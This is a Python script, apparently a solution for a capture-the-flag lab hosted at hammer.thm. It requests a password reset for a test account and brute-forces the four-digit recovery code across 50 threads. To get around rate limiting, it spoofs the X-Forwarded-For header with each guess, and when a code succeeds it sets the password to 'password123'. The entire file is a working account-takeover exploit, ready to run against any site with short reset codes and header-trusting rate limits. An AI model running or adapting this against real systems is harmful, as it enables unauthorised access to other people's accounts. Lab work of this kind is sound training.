#!/usr/bin/env python3

import sys
import threading
import requests

url = 'http://hammer.thm:1337/reset_password.php' 
email = "tester@hammer.thm"
stop_flag = threading.Event()
thread_count = 50
session = requests.Session()
invalid_code_message = "Invalid or expired recovery code!"

def reset_password():
    new_password = "password123"

    session.post(
        url,
        data={
            "new_password": new_password,
            "confirm_password": new_password,
        }
    )

    print(f"Password has been reset to {new_password}")
    return

def send_password_reset_request():
    try:   
        response = session.post(url, data={"email": email})

        if response.status_code != 200:
            print(f"Request failed, status code: {response.status_code}")
            print("Response:")
            print(response.text)
            sys.exit()
        
    except Exception as e:
        print(f"Request failed, exception: {e}")
        sys.exit()

    return

def enumerate_codes(codes):
    for code in codes:
        code_string = code
        try:               
            response = session.post(
                url, 
                headers={
                    'X-Forwarded-For': code
                } , 
                data={
                    'recovery_code': code,
                    's': 180
                },
                allow_redirects=False   
            )

            if stop_flag.is_set():
                return
            elif response.status_code == 302:
                stop_flag.set()
                print("Timeout reached. Try again.")
                return
            else:
                if invalid_code_message not in response.text:
                    stop_flag.set()
                    print(f"Recovery code found: {code_string}")                                       
                    print(f"Resetting password..")
                    reset_password()                 
                    return

        except Exception as e:
            print(e)
            pass
        
def main(): 
    global thread_count
    global session 
    
    if len(sys.argv) > 1:
        thread_count = int(sys.argv[1])

    print("Sending password reset request..")     
    send_password_reset_request()

    print(f"Brute-forcing recovery code..")
    code_range = 10000  
    threads = []
    thread_step = code_range // thread_count #Number of codes per thread 
     
    for i in range(thread_count):
        start = i * thread_step
        end = start + thread_step
       
        codes_thread_subset = range(start, end)
        codes_thread_subset = [f"{code:04d}" for code in codes_thread_subset]
             
        thread = threading.Thread(target=enumerate_codes, args=([codes_thread_subset]))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()
        
        
if __name__ == "__main__":
    main()